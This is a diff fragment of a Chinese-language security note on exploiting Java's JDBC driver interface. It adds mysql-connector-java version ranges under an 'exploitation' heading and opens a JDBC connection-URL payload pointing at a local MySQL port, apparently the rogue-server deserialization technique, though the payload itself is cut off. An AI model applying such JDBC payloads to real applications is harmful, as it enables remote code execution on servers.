@@ -17,6 +17,8 @@ JDBC定义了一个叫java.sql.Driver的接口类负责实现对数据库的连�
 
 ## ​**利用**
 不同版本的payload​
+mysql-connector-java <= 8.0.20
+mysql-connector-java-8.0.28.jar
 8.x​
 ```
 "jdbc:mysql://127.0.0.1:3309/test?characterEncoding=UTF-8&serverTimezone=Asia/Shanghai" +  ​
